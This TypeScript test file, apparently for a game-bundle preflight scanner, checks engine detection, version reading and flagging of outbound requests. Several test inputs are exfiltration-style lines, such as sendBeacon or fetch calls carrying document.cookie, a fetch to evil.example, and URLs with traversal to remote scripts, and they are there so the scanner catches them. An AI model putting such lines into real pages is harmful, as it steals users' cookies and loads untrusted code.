import test from 'node:test';
import assert from 'node:assert/strict';
import { existsSync, readdirSync, readFileSync, statSync } from 'node:fs';
import { join, relative, sep } from 'node:path';
import { fileURLToPath } from 'node:url';
import { preflight, type PreflightFile } from '../src/index';
import { platformPreflight } from '../src/platform';
import { compressedTextReaders } from '../src/node-compression';
import { compressedBrowserAsset } from '../src/names';

/* The engine strings below are copied byte for byte from real Vite builds in
   ~/Code/opengame-engine-fixtures (14 Oct 2026). The whole builds are 0.5 to 2 MB each,
   so the repository carries the lines that matter and the opt-in test at the bottom
   runs the real thing when it is on the machine. */

const file = (path: string, content: string): PreflightFile => ({ path, size: Buffer.byteLength(content), text: async () => content });
const binary = (path: string): PreflightFile => ({ path, size: 8, text: async () => { throw new Error('binary'); } });
const page = (...scripts: string[]) => `<!doctype html><html><body><canvas id="game"></canvas>${scripts.map((src) => `<script type="module" src="./${src}"></script>`).join('')}</body></html>`;
const game = (code: string, extra: PreflightFile[] = []) => platformPreflight([file('index.html', page('assets/index.js')), file('assets/index.js', code), ...extra]);
const codes = (result: { findings: { code: string; severity: string }[] }, severity: string) =>
  result.findings.filter((f) => f.severity === severity).map((f) => f.code);

const PHASER = 'var d={VERSION:"3.90.0",LOG_VERSION:"v390",BlendModes:0},c=d;'
  + 'function Config(v,e){this.gameTitle=e(v,"title",""),this.gameURL=e(v,"url","https://phaser.io/"+c.LOG_VERSION),this.gameVersion=e(v,"version","")}\n'
  + 'function banner(h){h.device.browser.ie&&window.console&&console.log("Phaser v"+d.VERSION+" / https://phaser.io")}\n'
  + 'var cache={save:function(v,m,x){m===void 0&&(m="file.json"),x===void 0&&(x="application/json");return new Blob([v],{type:x})}};';
const PIXI = 'const nt="8.22.0";class It{static init(){globalThis.__PIXI_APP_INIT__?.(this,nt)}static destroy(){}}\n'
  + 'function Bt(le,i){if(navigator.userAgent.indexOf("chrome")>-1){const e=[`%c  %c  %c  %c  %c PixiJS %c v${le} (${i}) http://www.pixijs.com/\\n\\n`,"background: #E72264; padding:5px 0;"];'
  + 'globalThis.console.log(...e)}else globalThis.console&&globalThis.console.log(`PixiJS ${le} - ${i} - http://www.pixijs.com/`)}\n'
  + 'function download(e,t){const r=document.createElement("a");r.download=e.filename??"image.png",r.href=t.toDataURL("image/png")}';
const BABYLON = 'class Ae{static get NpmPackage(){return"babylonjs@9.30.0"}static get Version(){return"9.30.0"}}\n'
  + 'const Ze={},be={};Ze._DefaultCdnUrl="https://cdn.babylonjs.com";Ze._CdnVersion="9.30.0";Ze._DefaultAssetsUrl="https://assets.babylonjs.com/core";\n'
  + 'be.SnippetUrl="https://snippet.babylonjs.com";';
const BABYLON_KTX = 'const c={};c.URLConfig={jsDecoderModule:"https://cdn.babylonjs.com/babylon.ktx2Decoder.js",wasmUASTCToASTC:null};';
const BABYLON_EXR = 'const x={HalfFloat:1};class F{}F.DefaultOutputType=x.HalfFloat;F.FFLATEUrl="https://unpkg.com/fflate@0.8.2";';
const PLAYCANVAS = 'const xE="GpuTimings",_0="2.23.2",EE="fa431cb";\n'
  + 'function init(e){"setAttribute"in e&&e.setAttribute("data-engine",`PlayCanvas ${_0}`)}\n'
  + 'function mapping(me,r,a,i){return me.join(r,a.replace(i,".mapping.json"))}\n'
  + 'const l={jsUrl:"draco.wasm.js",wasmUrl:"draco.wasm.wasm",numWorkers:2};\n'
  + 'const m={"image/vnd-ms.dds":"dds"};function parse(od,a){od.parse("filename.glb","",a)}const C4={canParse(e){return e.basename==="lod-meta.json"}};\n'
  + 'function find(h){return h.find(v=>v.filename==="meta.json")}';
/* React 19.3.1's production error formatter, as Vite minifies it, beside the element
   symbol the registry detects React by. */
const REACT = 'var z=Symbol.for("react.transitional.element"),Fz=Symbol.for("react.fragment");'
  + 'function r(U){var b="https://react.dev/errors/"+U;if(1<arguments.length){b+="?args[]="+encodeURIComponent(arguments[1]);'
  + 'for(var R=2;R<arguments.length;R++)b+="&args[]="+encodeURIComponent(arguments[R])}return"Minified React error #"+U+"; visit "+b}';
const THREE = 'const aa="185",Vl=0;function we(m){}typeof window<"u"&&(window.__THREE__?we("WARNING: Multiple instances of Three.js being imported."):window.__THREE__=aa);';

/* KAPLAY 3001.0.19 as the starter's Vite build minifies it (22 Oct 2026). Its other
   recorded pattern was the kaplayjs.com address, which the upstream dist carries only in
   inlined package metadata that the build drops, so a real KAPLAY game was reported as custom until this was measured. */
const KAPLAY = 'a=640,Ja=65536,vs=Symbol.for("kaplay.cancel"),bs=class extends Map{lastID=0};'
  + 'nh=(t={tagsAsComponents:!0})=>{d.k&&(console.warn("KAPLAY already initialized, you are calling kaplay() multiple times, it may lead bugs!"),d.k.quit()),d.globalOpt=t};';

test('a minified KAPLAY build is recognised as KAPLAY', async () => {
  assert.equal((await game(KAPLAY)).engine?.id, 'kaplay');
});

/* Kaigen, shaped like OG Clash R196 (22 Oct 2026), the first real Kaigen export measured.
   Its loader is split between index.html and a catalogue script, and the catalogue's
   worker bundles a copy of Three.js, so the game was reported as a Three.js game and never
   asked for the Kaigen publication statement. The glue text and the module are synthetic:
   fixtures/synthetic_kaigen.py builds Kaigen's two import names, an hz_flags section and a
   licence-stamp marker with fake fields. No Kaigen bytes are in this repository (Kaigen's
   beta agreement, 7(a)); the real export runs only through OPENGAME_KAIGEN_EXPORT. */
const KAIGEN = (JSON.parse(readFileSync(new URL('./fixtures/engine-signatures.json', import.meta.url), 'utf8')) as
  { id: string; text: string; wasm?: { path: string; base64: string }[] }[]).find((row) => row.id === 'kaigen' && row.wasm)!;
const KAIGEN_WASM = new Uint8Array(Buffer.from(KAIGEN.wasm![0]!.base64, 'base64'));
const module = (path: string, bytes: Uint8Array): PreflightFile =>
  ({ path, size: bytes.length, bytes: async () => bytes, text: async () => { throw new Error('binary'); } });
/** A valid module that imports nothing and carries nothing. */
const EMPTY_WASM = new Uint8Array([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0]);
const KAIGEN_SHELL = '<!doctype html><canvas id="c"></canvas><script type="module">'
  + 'import { createGame } from "./main.js"; import { bindCatalogGame } from "./oc_catalog.js";'
  + 'const game = bindCatalogGame(createGame({ canvas: c, wasmUrl: new URL("game.wasm.br", location.href).href }));</script>';
const kaigenGame = (glue: string, wasm: Uint8Array) => preflight([file('index.html', KAIGEN_SHELL), file('main.js', 'export function createGame(e){return e.wasmUrl}'),
  file('oc_catalog.js', 'export const bindCatalogGame=(g)=>g;const t=e.crossOriginIsolated;'),
  file('main_worker.js', glue), file('oc_catalog_worker.js', THREE), module('game.wasm', wasm)]);

test('a Kaigen export with a split loader is Kaigen, versioned from its wasm, ahead of the Three.js it bundles', async () => {
  // The shared memory every one of OG Clash's bundles makes, written by hand.
  const memory = 'const memory = new WebAssembly.Memory({ initial: 16, maximum: 16, shared: true });';
  const result = await kaigenGame(`${KAIGEN.text}\n${memory}`, KAIGEN_WASM);
  assert.equal(result.engine?.id, 'kaigen', JSON.stringify(result.engine));
  // The scan receipt's `threaded` is what moves a release onto the isolated contract.
  assert.equal(result.threaded, true);
  assert.equal(result.engine?.version, '0.6.2.001-beta');
  assert.match(result.engine?.evidence ?? '', /main_worker\.js and game\.wasm$/);
  assert.deepEqual(result.engine?.also.map((engine) => engine.id), ['threejs']);
  assert.deepEqual(result.engine?.licences, ['kaigen']);
});

/* The scan stops reading modules once the engine, its version and its stamp are settled.
   Thread use is part of what has to be settled first: here the glue says nothing about
   threads and only the second module's memory is shared, so stopping at the first would
   leave `threaded` unknown and the release on a contract without isolation. */
test('a settled Kaigen module does not stop the scan before a later module says threads', async () => {
  const shared = new Uint8Array([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0,
    0x02, 0x10, 0x01, 0x03, 0x65, 0x6e, 0x76, 0x06, 0x6d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0x02, 0x03, 0x01, 0x02]);
  const result = await preflight([file('index.html', KAIGEN_SHELL), file('main.js', 'export function createGame(e){return e.wasmUrl}'),
    file('oc_catalog.js', 'export const bindCatalogGame=(g)=>g;'), file('main_worker.js', KAIGEN.text),
    module('game.wasm', KAIGEN_WASM), module('pthread.wasm', shared)]);
  assert.equal(result.engine?.id, 'kaigen', JSON.stringify(result.engine));
  assert.equal(result.engine?.version, '0.6.2.001-beta', 'the first module settles the engine');
  assert.equal(result.threaded, true);
});

test('Kaigen glue names in a comment beside a module that does not import them are not Kaigen', async () => {
  const spoof = '/* customSections(m,"hz_flags") js_gpu_get_supported_compressed_formats: _os_get_file_range_bytes, */';
  for (const wasm of [EMPTY_WASM, new Uint8Array([0, 0x61, 0x73, 0x6d, 1, 0, 0, 0, 2, 9])]) {
    const result = await kaigenGame(spoof, wasm);
    assert.equal(result.engine?.id, 'threejs', JSON.stringify(result.engine));
    assert.ok(!result.engine?.also.some((engine) => engine.id === 'kaigen'));
    assert.equal(result.engine?.licences, undefined);
  }
  const alone = await preflight([file('index.html', '<canvas></canvas><script src="w.js"></script>'), file('w.js', spoof), module('game.wasm', EMPTY_WASM)]);
  assert.equal(alone.engine?.id, 'custom');
});

test('a Kaigen licence stamp asks for the statement even when the loader hides from every signature', async () => {
  // The glue's names split across strings, so no signature matches the text.
  const hidden = 'const n=["js_gpu_get_supported_","compressed_formats"].join(""),m=WebAssembly.Module["custom"+"Sections"](mod,"hz_"+"flags");';
  const result = await kaigenGame(hidden, KAIGEN_WASM);
  assert.equal(result.engine?.id, 'threejs', 'a stamp is not an identity and grants nothing');
  assert.deepEqual(result.engine?.licences, ['kaigen']);
});

test('the stamp is found in a renamed module and in a base64 SINGLE_FILE embed, at every alignment', async () => {
  const shell = file('index.html', '<canvas></canvas><script src="boot.js"></script>');
  const renamed: PreflightFile = { ...module('assets/game.bin', KAIGEN_WASM), head: async (length: number) => KAIGEN_WASM.subarray(0, length) };
  const viaName = await preflight([shell, file('boot.js', 'fetch("assets/game.bin")'), renamed]);
  assert.deepEqual(viaName.engine?.licences, ['kaigen']);
  for (const pad of [0, 1, 2]) {
    const inline = Buffer.concat([Buffer.alloc(pad), Buffer.from(KAIGEN_WASM)]).toString('base64');
    const result = await preflight([file('index.html', `<canvas></canvas><script>const w="data:application/wasm;base64,${inline}";</script>`)]);
    assert.deepEqual(result.engine?.licences, ['kaigen'], `alignment ${pad}`);
    assert.notEqual(result.engine?.id, 'kaigen', 'an embed asks for the statement and is still not an identity');
  }
});

test('a module that could not be decoded is named, not taken as having no stamp', async () => {
  const compressed: PreflightFile = { path: 'game.wasm.br', size: 16, text: async () => 'x',
    decodedText: Object.assign(async () => { throw new Error('decoded_limit'); }, {}) };
  const result = await preflight([file('index.html', '<canvas></canvas><script src="a.js"></script>'), file('a.js', 'const a=1;'), compressed]);
  const row = result.findings.find((f) => f.code === 'licence-search-incomplete');
  assert.equal(row?.path, 'game.wasm.br');
  assert.equal(result.engine?.licences, undefined);
});

test('a Kaigen version string alone names no engine, and a Three.js game with a wasm decoder stays Three.js', async () => {
  const result = await game(THREE, [binary('draco_decoder.wasm')]);
  assert.equal(result.engine?.id, 'threejs');
  assert.equal(result.engine?.version, 'r185');
  assert.deepEqual(result.engine?.also, []);
  assert.equal(result.engine?.licences, undefined);
});

/* The real build, when somebody points at a copy of it: OPENGAME_KAIGEN_EXPORT=<folder>.
   Never the staging folder itself. */
test('the real OG Clash export is Kaigen 0.6.2.001-beta', { skip: !process.env.OPENGAME_KAIGEN_EXPORT && 'set OPENGAME_KAIGEN_EXPORT to a copy of the export' }, async () => {
  const root = process.env.OPENGAME_KAIGEN_EXPORT!;
  const all: string[] = [];
  const walk = (dir: string) => { for (const name of readdirSync(dir)) { const path = join(dir, name); statSync(path).isDirectory() ? walk(path) : all.push(path); } };
  walk(root);
  const rows = all.map((full) => ({ path: relative(root, full).split(sep).join('/'), size: statSync(full).size, full }));
  const decodedText = compressedTextReaders(() => rows.filter((row) => !compressedBrowserAsset(row.path)).reduce((sum, row) => sum + row.size, 0));
  const files = rows.map((row) => { const bytes = async () => new Uint8Array(readFileSync(row.full));
    return { path: row.path, size: row.size, text: async () => readFileSync(row.full, 'utf8'), bytes, decodedText: decodedText(row.path, row.size, bytes) }; });
  const result = await platformPreflight(files);
  assert.equal(result.engine?.id, 'kaigen', JSON.stringify(result.engine));
  assert.equal(result.threaded, true);
  assert.equal(result.engine?.version, '0.6.2.001-beta');
  assert.deepEqual(result.engine?.licences, ['kaigen']);
});

test('Emscripten\'s default wasm name inside a Unity framework is not a missing file, and a real missing file still is', async () => {
  /* Unity 6 framework.js, as both real exports measured on 22 Oct 2026 carry it. */
  const framework = "var wasmBinaryFile;wasmBinaryFile='build.wasm';if(!isDataURI(wasmBinaryFile)){wasmBinaryFile=locateFile(wasmBinaryFile)}"
    + "var t=new Image();t.src='sprites/missing.png';";
  const result = await preflight([file('index.html', '<script src="Build/pang.loader.js"></script><script>createUnityInstance(c, {})</script>'),
    file('Build/pang.loader.js', 'function createUnityInstance(){}'), file('Build/pang.framework.js', framework), binary('Build/pang.wasm'), binary('Build/pang.data')]);
  assert.equal(result.engine?.id, 'unity');
  const missing = result.findings.find((f) => f.code === 'missing-ref');
  assert.ok(missing, 'the real missing sprite is still reported');
  assert.ok(missing.more?.some((row) => row.endsWith('sprites/missing.png')), JSON.stringify(missing.more));
  assert.ok(!missing.more?.some((row) => /build\.wasm$/.test(row)), JSON.stringify(missing.more));
});

test('each library engine is named with the version its own build reports', async () => {
  for (const [code, id, version] of [
    [PHASER, 'phaser', '3.90.0'], [PIXI, 'pixijs', '8.22.0'], [BABYLON, 'babylonjs', '9.30.0'],
    [PLAYCANVAS, 'playcanvas', '2.23.2'], [THREE, 'threejs', 'r185'],
  ] as const) {
    const result = await game(code);
    assert.equal(result.engine?.id, id);
    assert.equal(result.engine?.version, version, id);
    assert.equal(result.checks.engine, 'inconclusive', 'naming the engine settles nothing about whether it runs');
    const note = result.findings.find((f) => f.code === 'platform-engine');
    assert.match(note?.detail ?? '', new RegExp(`Built with \\S+(?: \\S+)? ${version.replace(/\./g, '\\.')}`));
  }
});

test('exporters are recognised from the folder they write', async () => {
  const godot = await preflight([file('index.html', '<script src="index.js"></script><script>const GODOT_CONFIG = {"executable":"index"}; new Engine(GODOT_CONFIG).startGame();</script>'),
    file('index.js', 'const Engine = (function () { const GodotFS = {}; return function () {}; })();'), binary('index.wasm'), binary('index.pck')]);
  assert.equal(godot.engine?.id, 'godot');
  const unity = await preflight([file('index.html', '<script src="Build/web.loader.js"></script><script>createUnityInstance(canvas, {})</script>'),
    file('Build/web.loader.js', 'function createUnityInstance(){}'), file('Build/web.framework.js', 'var unityFramework=function(){}'), binary('Build/web.wasm'), binary('Build/web.data')]);
  assert.equal(unity.engine?.id, 'unity');
  const construct = await preflight([file('index.html', '<meta name="generator" content="Scirra Construct"><script src="scripts/main.js"></script>'),
    file('scripts/main.js', ''), file('scripts/c3runtime.js', ''), file('data.json', '{}')]);
  assert.equal(construct.engine?.id, 'construct');
  const gdevelop = await preflight([file('index.html', '<script src="runtimegame.js"></script><script src="data.js"></script>'),
    file('runtimegame.js', 'var gdjs;(function(gdjs){class RuntimeGame{}gdjs.RuntimeGame=RuntimeGame})(gdjs||(gdjs={}));'),
    file('data.js', 'gdjs.projectData = {"properties":{"gdVersion":{"build":222,"major":5,"minor":5,"revision":0}}};'),
    file('pixi.js', PIXI)]);
  assert.equal(gdevelop.engine?.id, 'gdevelop', 'the exporter, not the renderer it ships');
  assert.equal(gdevelop.engine?.version, '5.5.222');
  assert.deepEqual(gdevelop.engine?.also.map((e) => e.id), ['pixijs']);
  const defold = await preflight([file('index.html', '<script src="dmloader.js"></script>'), file('dmloader.js', 'var EngineLoader = {};'),
    file('archive/archive_files.json', '{"content":[]}'), binary('game.wasm')]);
  assert.equal(defold.engine?.id, 'defold');
});

test('one of these files alone is not an exporter', async () => {
  assert.equal((await preflight([file('index.html', page('a.js')), file('a.js', ''), binary('level.pck')])).engine?.id, 'custom');
  assert.equal((await preflight([file('index.html', page('a.js')), file('a.js', ''), file('Build/web.loader.js', '')])).engine?.id, 'custom');
  const wasm = await preflight([file('index.html', page('a.js')), file('a.js', ''), binary('physics.wasm')]);
  assert.equal(wasm.engine?.id, 'custom', 'a wasm module with no loader we know is not evidence of no engine');
});

test('a real plain canvas build reports no engine and passes clean', async () => {
  const root = fileURLToPath(new URL('./fixtures/canvas-plain/', import.meta.url));
  const files = walk(root).map((full) => file(relative(root, full).split(sep).join('/'), readFileSync(full, 'utf8')));
  const result = await platformPreflight(files);
  assert.equal(result.engine?.id, 'custom');
  assert.equal(result.ok, true);
  assert.deepEqual(codes(result, 'blocker'), []);
  assert.deepEqual(codes(result, 'warning'), []);
});

test('engine defaults are notes, and the bundle passes', async () => {
  for (const [code, engine, hosts] of [
    [PHASER, 'Phaser', ['phaser.io']],
    [PIXI, 'PixiJS', ['www.pixijs.com']],
    [BABYLON + '\n' + BABYLON_KTX + '\n' + BABYLON_EXR, 'Babylon.js', ['cdn.babylonjs.com', 'assets.babylonjs.com', 'snippet.babylonjs.com', 'cdn.babylonjs.com', 'unpkg.com']],
  ] as const) {
    const result = await game(code);
    assert.equal(result.ok, true, `${engine}: ${JSON.stringify(result.findings.filter((f) => f.severity === 'blocker'))}`);
    assert.deepEqual(codes(result, 'blocker'), []);
    const notes = result.findings.filter((f) => f.code === 'engine-default' && !f.more);
    assert.deepEqual(notes.map((f) => /names (\S+),/.exec(f.title)?.[1]).sort(), [...hosts].sort());
    assert.ok(notes.every((f) => f.severity === 'note' && f.title.endsWith(`a ${engine} default.`)));
  }
});

test('library default file names are one note per engine, not missing files', async () => {
  for (const [code, engine, count] of [[PHASER, 'Phaser', 1], [PIXI, 'PixiJS', 1], [PLAYCANVAS, 'PlayCanvas', 4]] as const) {
    /* Four of the seven: `{"image/vnd-ms.dds":"dds"}` is an object key and
       `basename==="lod-meta.json"` and `filename==="meta.json"` are comparisons, which the
       reference check no longer reads as files at all, so their rows went. */
    const result = await game(code);
    assert.equal(result.findings.some((f) => f.code === 'missing-ref'), false, engine);
    const note = result.findings.filter((f) => f.code === 'engine-default' && f.more);
    assert.equal(note.length, 1);
    assert.equal(note[0]!.severity, 'note');
    assert.equal(note[0]!.more!.length, count);
    assert.match(note[0]!.title, new RegExp(`^${engine}'s own code names ${count} file`));
  }
});

test('the same names without the engine are still missing files', async () => {
  const result = await game('const save = "file.json"; const shot = "image.png"; const mesh = "draco.wasm.js";');
  const missing = result.findings.find((f) => f.code === 'missing-ref');
  assert.equal(missing?.severity, 'warning');
  assert.equal(missing?.more?.length, 3);
  assert.equal(result.findings.some((f) => f.code === 'engine-default'), false);
});

test('a default name built against the page is a request, whatever the engine', async () => {
  const result = await game(PHASER + '\nfetch(new URL("file.json", location.href));');
  const missing = result.findings.find((f) => f.code === 'missing-ref');
  assert.equal(missing?.severity, 'warning');
  assert.match(missing?.more?.[0] ?? '', /file\.json$/);
});

/* Since 2027-03 an ordinary https host is allowed, so "read as a request" is one of two
   things: a blocker, for a blocked service or plain http, or a line in the external-hosts
   note. An engine default that wrongly matched would take a URL out of both, which is
   what every test below still asks. */
const requested = (result: { findings: { code: string; severity: string; title: string }[] }, host: string) =>
  result.findings.some((f) => (f.severity === 'blocker' || f.code === 'external-hosts') && f.title.includes(host));

test('a default the bundle shows it uses is read as the request it will be', async () => {
  const ktx = await game(BABYLON + '\n' + BABYLON_KTX, [binary('textures/ground.ktx2')]);
  assert.ok(requested(ktx, 'cdn.babylonjs.com'), 'a .ktx2 texture means Babylon will fetch its decoder from the CDN');
  const exr = await game(BABYLON + '\n' + BABYLON_EXR, [binary('sky.exr')]);
  assert.ok(requested(exr, 'unpkg.com'));
});

test('a custom game that fetches another origin names it, and one that fetches a blocked service blocks', async () => {
  const result = await game('fetch("https://evil.example/x").then((r) => r.json());');
  assert.equal(result.engine?.id, 'custom');
  assert.equal(result.ok, true);
  assert.ok(requested(result, 'evil.example'));
  const stripe = await game('fetch("https://api.stripe.com/v1/charges").then((r) => r.json());');
  assert.equal(stripe.ok, false);
  assert.ok(stripe.findings.some((f) => f.code === 'blocked-service' && f.severity === 'blocker' && f.title.includes('api.stripe.com, Stripe')));
});

test('a file named phaser.js gets nothing from its name, and a real Phaser gets nothing past the exact URL', async () => {
  const named = await platformPreflight([file('index.html', page('phaser.js')), file('phaser.js', 'fetch("https://phaser.io/");')]);
  assert.equal(named.engine?.id, 'custom');
  assert.ok(requested(named, 'phaser.io'), 'no Phaser signature, so phaser.io is an ordinary outbound request');

  for (const [extra, host] of [
    ['fetch("https://evil.example/x");', 'evil.example'],
    ['fetch("https://phaser.io/telemetry");', 'phaser.io'],
    ['fetch("https://cdn.babylonjs.com/anything-else.js");', 'cdn.babylonjs.com'],
    ['import("https://phaser.io/");', 'phaser.io'],
  ] as const) {
    const result = await platformPreflight([file('index.html', page('phaser.js')), file('phaser.js', PHASER + '\n' + extra)]);
    assert.equal(result.engine?.id, 'phaser');
    assert.ok(requested(result, host), extra);
  }

  /* Another engine's default is not this engine's default. */
  const crossed = await game(PHASER + '\nconst cdn="https://cdn.babylonjs.com";');
  assert.ok(requested(crossed, 'cdn.babylonjs.com'));

  /* A page loading the exact default URL as a script is a request, whatever the engine. */
  const html = await platformPreflight([file('index.html', page('assets/index.js') + '<script src="https://phaser.io/"></script>'), file('assets/index.js', PHASER)]);
  assert.ok(requested(html, 'phaser.io'));
});

/* The mutation test for every URL row: a bundle carrying the real engine and its real
   default line, plus a request that reuses the exact default string somewhere the engine
   never writes it. The first version of the table keyed on the string alone and passed
   every one of these except the last pair as notes. */
test('an engine default at any other site, or with anything appended, is still a request', async () => {
  const ALL = PHASER + '\n' + PIXI + '\n' + BABYLON + '\n' + BABYLON_KTX + '\n' + BABYLON_EXR + '\n' + REACT;
  const alone = await game(ALL);
  assert.equal(alone.ok, true, 'the real lines alone pass, or the cases below prove nothing');
  for (const host of ['unpkg.com', 'cdn.babylonjs.com', 'assets.babylonjs.com', 'snippet.babylonjs.com', 'phaser.io', 'www.pixijs.com', 'react.dev'])
    assert.equal(requested(alone, host), false, `${host} is only a default in the real lines, or the cases below prove nothing`);
  for (const [extra, host] of [
    ['fetch("https://unpkg.com/fflate@0.8.2" + "/../evil@1/x.js");', 'unpkg.com'],
    ['fetch("https://unpkg.com/fflate@0.8.2");', 'unpkg.com'],
    ['F.FFLATEUrl="https://unpkg.com/fflate@0.8.2"+"/../evil@1/x.js";', 'unpkg.com'],
    ['fetch("https://cdn.babylonjs.com" + location.hash);', 'cdn.babylonjs.com'],
    ['Ze._DefaultCdnUrl="https://cdn.babylonjs.com"+"/x.js";', 'cdn.babylonjs.com'],
    ['const s={jsDecoderModule:"https://cdn.babylonjs.com/babylon.ktx2Decoder.js"};', 'cdn.babylonjs.com'],
    ['new Image().src = "https://assets.babylonjs.com/core" + "/../x";', 'assets.babylonjs.com'],
    ['navigator.sendBeacon("https://snippet.babylonjs.com", document.cookie);', 'snippet.babylonjs.com'],
    ['fetch("https://phaser.io/" + document.cookie);', 'phaser.io'],
    ['this.gameURL=e(v,"url","https://phaser.io/"+document.cookie);', 'phaser.io'],
    ['fetch(`http://www.pixijs.com/`);', 'www.pixijs.com'],
    ['fetch("https://react.dev/errors/"+location.hash);', 'react.dev'],
    ['function q(U){var b="https://react.dev/errors/"+U;fetch(b)}', 'react.dev'],
    ['var b="https://react.dev/errors/"+U;if(1<arguments.length){b+="?args[]="}', 'react.dev'],
    /* A different quote ends the URL match early while the string runs on. */
    [`import(F.FFLATEUrl="https://unpkg.com/fflate@0.8.2',/../../evil@1/x.js");`, 'unpkg.com'],
    [`fetch(F.FFLATEUrl='https://unpkg.com/fflate@0.8.2");/../../evil@1/x.js');`, 'unpkg.com'],
    [`c.URLConfig={jsDecoderModule:"https://cdn.babylonjs.com/babylon.ktx2Decoder.js',/../x.js"};`, 'cdn.babylonjs.com'],
    [`this.gameURL=e(v,"url","https://phaser.io/'+c.LOG_VERSION)@evil.com/");`, 'phaser.io'],
    ['const e=[`%c PixiJS %c v${a} (${b}) http://www.pixijs.com/\\n`];fetch(`http://www.pixijs.com/`+e);', 'www.pixijs.com'],
  ] as const) {
    const result = await game(ALL + '\n' + extra);
    assert.ok(requested(result, host), extra);
  }
});

test('a console reached through a global name is a reporting call, and only the call', async () => {
  for (const code of [
    'globalThis.console.log("see https://docs.example.com/a");',
    'window.console.warn("see https://docs.example.com/a");',
    'self.console.error("see https://docs.example.com/a");',
    'globalThis.console&&globalThis.console.log(`PixiJS ${v} - http://docs.example.com/`);',
  ]) {
    const result = await game(code);
    assert.equal(result.ok, true, code);
  }
  for (const code of [
    'game.console.log("https://ko-fi.com/x");',
    'globalThis.console.log(fetch("https://ko-fi.com/x"));',
    'window.console.warn("x"); fetch("https://ko-fi.com/x");',
    'const consoleUrl = "https://ko-fi.com/x"; globalThis.fetch(consoleUrl);',
  ]) {
    const result = await game(code);
    assert.equal(result.ok, false, code);
  }
});

/* -------------------------------------------------------------------------- */
/* The real builds, when they are on this machine                              */
/* -------------------------------------------------------------------------- */

const FIXTURES = process.env.OPENGAME_ENGINE_FIXTURES ?? join(process.env.HOME ?? '', 'Code/opengame-engine-fixtures');
const EXPECTED: [string, string, string | null][] = [
  ['canvas-plain', 'custom', null], ['phaser-dodge', 'phaser', '3.90.0'], ['pixi-blocks', 'pixijs', '8.22.0'],
  ['babylon-orbit', 'babylonjs', '9.30.0'], ['playcanvas-roll', 'playcanvas', '2.23.2'], ['three-vite-sdk', 'threejs', 'r185'],
];

function walk(dir: string): string[] {
  return readdirSync(dir, { withFileTypes: true }).sort((a, b) => a.name.localeCompare(b.name, 'en'))
    .flatMap((entry) => entry.isDirectory() ? walk(join(dir, entry.name)) : [join(dir, entry.name)]);
}

test('every engine fixture build passes with its engine named', { skip: !existsSync(FIXTURES) && `no fixtures at ${FIXTURES}`, timeout: 300000 }, async () => {
  for (const [name, id, version] of EXPECTED) {
    const root = join(FIXTURES, name, 'dist');
    const list = walk(root).map((full) => ({ path: relative(root, full).split(sep).join('/'), full, size: statSync(full).size }));
    const ordinary = list.filter((f) => !compressedBrowserAsset(f.path)).reduce((sum, f) => sum + f.size, 0);
    const decoded = compressedTextReaders(() => ordinary);
    const files = list.map((f) => ({ path: f.path, size: f.size, text: async () => readFileSync(f.full, 'utf8'),
      bytes: async () => new Uint8Array(readFileSync(f.full)), decodedText: decoded(f.path, f.size, async () => new Uint8Array(readFileSync(f.full))) }));
    const result = await platformPreflight(files, { inspectDecodedCredentials: true });
    assert.equal(result.engine?.id, id, name);
    assert.equal(result.engine?.version, version, name);
    assert.equal(result.ok, true, `${name}: ${JSON.stringify(result.findings.filter((f) => f.severity !== 'note'))}`);
    assert.deepEqual(codes(result, 'warning'), [], name);
  }
});

/* three-racer, a Vite build of three 0.186.1 (24 Oct 2026): r186 writes the revision in
   place rather than assigning REVISION by name, and was reported with no version. */
test('Three.js r186, which registers its revision as a literal, keeps its version', async () => {
  const r186 = 'typeof window<"u"&&(window.__THREE__?ut("WARNING: Multiple instances of Three.js being imported."):window.__THREE__="186");';
  const result = await game(r186);
  assert.equal(result.engine?.id, 'threejs');
  assert.equal(result.engine?.version, 'r186');
  assert.equal((await game('window.__THREE__=R;const R="185";')).engine?.version, 'r185', 'a name is still read through its declaration');
  assert.equal((await game('window.__THREE__="../evil";')).engine?.version ?? null, null, 'only a revision number is a version');
});

/* Each LittleJS shape needs its WebGL fallback message beside it: a credit line with the
   banner, or two constants that happen to say LittleJS, are not the engine. */
test('a LittleJS banner or name constant alone, without the engine beside it, is not LittleJS', async () => {
  for (const code of ['const credit="LittleJS Engine v1.28.0";', 'var a="LittleJS",b="1.28.0";']) {
    assert.notEqual((await game(code)).engine?.id, 'littlejs', code);
    assert.equal((await game(`${code}console.error("LittleJS: WebGL can not draw on this device, using Canvas2D");`)).engine?.version, '1.28.0', code);
  }
  assert.equal((await game('console.log("LittleJS Engine v1.29.0-beta");console.error("LittleJS: WebGL can not draw on this device, using Canvas2D");')).engine?.version ?? null, null,
    'a version the pattern does not end cleanly on is no version, not a truncated one');
});

/* A signature that opened with `[\w$]+` backtracked over every long word run, and a 2 MB
   base64 string in text-evidence's fixtures held the suite at 100% CPU for 23 minutes
   before the LittleJS constants pattern was anchored on its `=` (24 Oct 2026). Every
   registry pattern has to stay linear on the inputs a bundle really carries. */
test('engine signatures stay fast on long word runs and long whitespace', async () => {
  const { detectEngine } = await import('../src/engines');
  for (const text of ['A'.repeat(2_000_000), `x="${'A'.repeat(2_000_000)}"`, `${'a'.repeat(500_000)}=${' '.repeat(100_000)}`]) {
    const started = performance.now();
    detectEngine(['a.js'], [{ path: 'a.js', text }], { complete: true });
    assert.ok(performance.now() - started < 2000, `${Math.round(performance.now() - started)} ms on a ${text.length}-character input`);
  }
});

/* -------------------------------------------------------------------------- */
/* Raw WebAssembly, Luau and a real love.js export                            */
/* -------------------------------------------------------------------------- */

const leb = (value: number) => { const out: number[] = []; do { let b = value & 0x7f; value >>>= 7; if (value) b |= 0x80; out.push(b); } while (value); return out; };
const wasmName = (text: string) => { const b = [...new TextEncoder().encode(text)]; return [...leb(b.length), ...b]; };
const wasmSection = (id: number, body: number[]) => [id, ...leb(body.length), ...body];
/** A module that imports each name as a function from `env` and holds each text in a
 * custom section of its own, which is all a structural reading looks at. */
function wasmWith({ imports = [], custom = [] }: { imports?: string[]; custom?: [string, string][] } = {}): Uint8Array {
  const out = [0, 0x61, 0x73, 0x6d, 1, 0, 0, 0];
  if (imports.length) out.push(...wasmSection(1, [1, 0x60, 0, 0]),
    ...wasmSection(2, [...leb(imports.length), ...imports.flatMap((name) => [...wasmName('env'), ...wasmName(name), 0, 0])]));
  for (const [title, text] of custom) out.push(...wasmSection(0, [...wasmName(title), ...new TextEncoder().encode(text)]));
